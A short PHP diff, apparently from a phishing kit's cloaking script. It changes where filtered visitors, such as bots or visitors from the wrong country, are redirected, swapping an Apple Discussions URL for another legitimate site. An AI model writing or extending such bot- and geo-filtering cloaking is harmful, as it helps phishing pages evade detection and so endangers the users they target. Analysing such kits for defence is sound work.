@@ -60,7 +60,7 @@ if (deviceBot() === 'NO') {
             exit();
         } else {
             insertVisitor($origin, "Apple Discussions", 'YES', 'Diff country');
-            header("Location: https://discussions.apple.com/community/stores/app-store", TRUE, 301);
+            header("Location: https://www.mailgenius.com/", TRUE, 301);
             exit();
         }
     } else if ($chek_bot_ip === 'YES') {
